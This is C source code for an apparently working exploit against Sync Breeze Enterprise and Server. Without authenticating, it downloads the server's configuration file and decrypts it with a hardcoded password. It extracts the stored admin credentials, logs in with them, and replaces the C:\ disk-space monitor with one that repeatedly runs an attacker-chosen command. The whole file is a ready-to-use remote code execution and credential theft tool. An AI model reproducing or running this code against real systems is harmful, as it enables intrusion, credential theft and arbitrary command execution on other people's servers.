#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <Windows.h>
#include "syncbreeze.h"

#define LOCAL_CONFIG_FILE_PATH ".\\syncbreezeent.flx"

char* ConfigFilePath[] = {
	"C:\\Program Files\\Sync Breeze Enterprise\\config\\syncbreezeent.flx",
	"C:\\Program Files(x86)\\Sync Breeze Enterprise\\config\\syncbreezeent.flx",
	"C:\\Program Files\\Sync Breeze Server\\config\\syncbreezesrv.flx",
	"C:\\Program Files(x86)\\Sync Breeze Server\\config\\syncbreezesrv.flx"
};

int args(char* arg) {
	char* options[] = {
		"addr",				//0
		"port",				//1
		"creds",			//2
		"lconfig",			//3
		"rconfig",			//4
		"cmd"				//5
	};
	int i;
	for (i = 0; i < sizeof(options) / sizeof(options[0]); i++) {
		if (!strcmp(arg, options[i])) {
			return i;
		}
	}
	return -1;
}

//Usage: %s [addr <addr>] [port <port>] [creds <user> <password>] [lconfig <lfile>] [rconfig <rfile>] [cmd <command line>]
int main(int argc, char** argv) {
	int i;

	char* addr = 0;
	int port = 9121;
	char ServerUserName[260] = { 0 };
	char ServerPassword[260] = { 0 };
	int creds = 0;
	char* LocalConfigFilePath = 0;
	char* CustomConfigFilePath = 0;
	char* cmd = 0;
	for (i = 1; i < argc;) {
		switch (args(argv[i])) {
		case 0: //addr
			addr = argv[i + 1];
			i += 2;
			break;
		case 1: //port
			port = atoi(argv[i + 1]);
			i += 2;
			break;
		case 2: //creds
			strcpy(ServerUserName, argv[i + 1]);
			strcpy(ServerPassword, argv[i + 2]);
			creds = 1;
			i += 3;
			break;
		case 3: //lconfig
			LocalConfigFilePath = argv[i + 1];
			i += 2;
			break;
		case 4: //rconfig
			CustomConfigFilePath = argv[i + 1];
			i += 2;
			break;
		case 5: //cmd
			cmd = argv[i + 1];
			i += 2;
			break;
		default:
			printf("Unknown option\n");
			return 0;
		}
	}

	printf("addr = %s\n", addr);
	printf("port = %d\n", port);
	if (creds) {
		printf("ServerUserName = %s\n", ServerUserName);
		printf("ServerPassword = %s\n", ServerPassword);
	}
	printf("LocalConfigFilePath = %s\n", LocalConfigFilePath);
	printf("CustomConfigFilePath = %s\n", CustomConfigFilePath);
	printf("cmd = %s\n", cmd);

	if (!addr || !cmd) {
		printf("Wrong usage\n");
		return 0;
	}

	if (syncbreeze_init()) {
		printf("[-] syncbreeze_init() failed\n");
		return 0;
	}
	printf("[+] syncbreeze_init()\n");

	int result;
	DWORD error;

	if (!creds && !LocalConfigFilePath) {
		//first connect (without login)
		struct _LIBPAL_SCA_NetTransport NetTransport = { 0 };
		if (!addr) {
			printf("addr has to be set\n");
			return 0;
		}
		SCA_NetTransport_SCA_NetTransport(&NetTransport, 0);
		result = SCA_NetTransport_Connect(&NetTransport, addr, port, -1, &error);
		if (!result) {
			printf("[-] SCA_NetTransport_Connect() failed: %d\n", error);
			return 0;
		}
		printf("[+] First connection\n");

		//download config file
		if (!CustomConfigFilePath) {
			for (i = 0; i < sizeof(ConfigFilePath) / sizeof(ConfigFilePath[0]); i++) {
				result = SCA_NetTransport_DownloadFile(&NetTransport, ConfigFilePath[i], LOCAL_CONFIG_FILE_PATH, 0, &error, 0);
				if (result) {
					break;
				}
				printf("[!] SCA_NetTransport_DownloadFile(%s) failed: %d\n", ConfigFilePath[i], error);
			}
			if (i == sizeof(ConfigFilePath) / sizeof(ConfigFilePath[0])) {
				printf("[-] Could not download config file with default paths\n");
				return 0;
			}
		} else {
			result = SCA_NetTransport_DownloadFile(&NetTransport, CustomConfigFilePath, LOCAL_CONFIG_FILE_PATH, 0, &error, 0);
			if (!result) {
				printf("[-] SCA_NetTransport_DownloadFile(%s) failed: %d\n", CustomConfigFilePath, error);
				printf("[-] Could not download config custom path\n");
				return 0;
			}
		}
		//TODO somehow need to be sure file is fully downloaded
		Sleep(1000);
		LocalConfigFilePath = LOCAL_CONFIG_FILE_PATH;
		printf("[+] Config file downloaded\n");
	}

	if (!creds) {
		//load config file
		struct _LIBPAL_SCA_ConfigObj ServerConfig = { 0 };
		SCA_ConfigObj_SCA_ConfigObj(&ServerConfig, 0);
		result = SCA_ConfigObj_Load(&ServerConfig, LocalConfigFilePath, "SCOMPSYS", &error); // hardcoded password
		if (!result) {
			printf("[-] SCA_ConfigObj_Load(%s) failed: %d\n", LocalConfigFilePath, error);
			return 0;
		}
		printf("[+] Config file loaded\n");
		result = SCA_ConfigObj_GetField_cci(&ServerConfig, "ServerUserName", ServerUserName, 260);
		result &= SCA_ConfigObj_GetField_cci(&ServerConfig, "ServerPassword", ServerPassword, 260);
		if (!result) {
			printf("[-] Have not found credentials in config file\n");
			return 0;
		}
		printf("[+] ServerUserName = %s\n", ServerUserName);
		printf("[+] ServerPassword = %s\n", ServerPassword);
	}

	//second connection (with login)
	struct _LIBSYNC_SCA_SyncBreezeInterface SyncBreezeInterface = { 0 };
	struct _LIBSYNC_SCA_SyncBreezeClient* SyncBreezeClient = (struct _LIBSYNC_SCA_SyncBreezeClient*)&SyncBreezeInterface;
	SCA_SyncBreezeInterface_SCA_SyncBreezeInterface(&SyncBreezeInterface);
	result = SCA_SyncBreezeClient_Connect(SyncBreezeClient, addr, port, -1, &error);
	if (!result) {
		printf("[-] SCA_SyncBreezeClient_Connect() failed: %d\n", error);
		return 0;
	}
	printf("[+] Second connection\n");

	//login
	int LoginStatus;
	int ClientUserId;
	int Permissions;
	int LicenseStatus;
	char LicenseStatusString[0x200] = { 0 };
	int LicenseStatusStringLength = 0x200;
	result = SCA_SyncBreezeInterface_Login(&SyncBreezeInterface, ServerUserName, ServerPassword, &LoginStatus, &ClientUserId, &Permissions, &LicenseStatus, LicenseStatusString, LicenseStatusStringLength);
	if (!result || !LoginStatus) {
		printf("[-] SCA_SyncBreezeInterface_Login() failed\n");
		//probably credentials are wrong
		return 0;
	}
	printf("[+] Login (%d %d %d %d %s)\n", LoginStatus, ClientUserId, Permissions, LicenseStatus, LicenseStatusString);

	//delete current C:\ monitor
	struct _LIBPAL_SCA_ConfigObj* MonitorListConfig = 0;
	result = SCA_SyncBreezeClient_GetSpaceMonitorListObj(SyncBreezeClient, &MonitorListConfig, 0);
	if (result) {
		//SCA_ConfigObj_Show(MonitorListConfig, 1);
		struct _LIBPAL_SCA_ConfigObj* CurrentMonitor = MonitorListConfig->FieldsList;
		while (CurrentMonitor) {
			char Temp[260] = { 0 };
			result = SCA_ConfigObj_GetField_cci(CurrentMonitor, "Path", Temp, 260);
			printf("[*] Found monitor for %s\n", Temp);
			if (result) {
				if (!strcmp(Temp, "C:\\")) {
					/*result = */SCA_ConfigObj_GetField_cci(CurrentMonitor, "MonitorId", Temp, 260);
					SCA_SyncBreezeClient_DeleteSpaceMonitor(SyncBreezeClient, atoi(Temp));
					printf("[*] Deleted monitor for C:\\\n");
					break;
				}
			}
			CurrentMonitor = CurrentMonitor->Next;
		}
	} else {
		printf("SCA_SyncBreezeClient_GetSpaceMonitorListObj() failed, will try to add space monitor blindly\n");
	}

	//create new C:\ space monitor
	struct _LIBSPP_SCA_SpaceMon SpaceMon = { 0 };
	SCA_SpaceMon_SCA_SpaceMon(&SpaceMon);
	strcpy(SpaceMon.Path, "C:\\");
	SpaceMon.FreeSpace = 1;
	SpaceMon.AutoDisable = 0;

	struct _LIBSPP_SCA_SpaceMonAction SpaceMonAction = { 0 };
	SCA_SpaceMonAction_SCA_SpaceMonAction(&SpaceMonAction);
	SpaceMonAction.ActionId = 0;
	SpaceMonAction.CondType = 1;
	SpaceMonAction.CondValue = 1;
	SpaceMonAction.CondUnits = 2;
	SpaceMonAction.ExecuteCommand = 1;
	strcpy(SpaceMonAction.CommandName, cmd);
	SpaceMonAction.RepeatAction = 1;
	SpaceMonAction.RepeatTimeValue = 1;
	SpaceMonAction.RepeatTimeUnits = 1;

	struct _LIBSPP_SCA_SpaceMonAction_ListItem SpaceMonAction_ListItem = { 0 };
	SpaceMonAction_ListItem.vftable = SCA_ListItem_SCA_SpaceMonAction_vftable;
	SpaceMonAction_ListItem.ActionId = SpaceMonAction.ActionId;
	SpaceMonAction_ListItem.SpaceMonAction = &SpaceMonAction;

	SpaceMon.FirstActionItem = &SpaceMonAction_ListItem;
	SpaceMon.LastActionItem = &SpaceMonAction_ListItem;
	SpaceMon.nActionItems = 1;
	SpaceMon.field_128 = 1; //what is that? if(SpaceMonAction.ActionId >= SpaceMon.field_128) { SpaceMon.field_128 = SpaceMonAction.ActionId + 1; }

	result = SCA_SyncBreezeInterface_AddSpaceMonitor(&SyncBreezeInterface, &SpaceMon);
	if (!result) {
		printf("[-] SCA_SyncBreezeInterface_AddSpaceMonitor() failed\n");
		return 0;
	}
	printf("[+] Enjoy!\n");
	
	printf("I am alive\n");
	return 0;
}
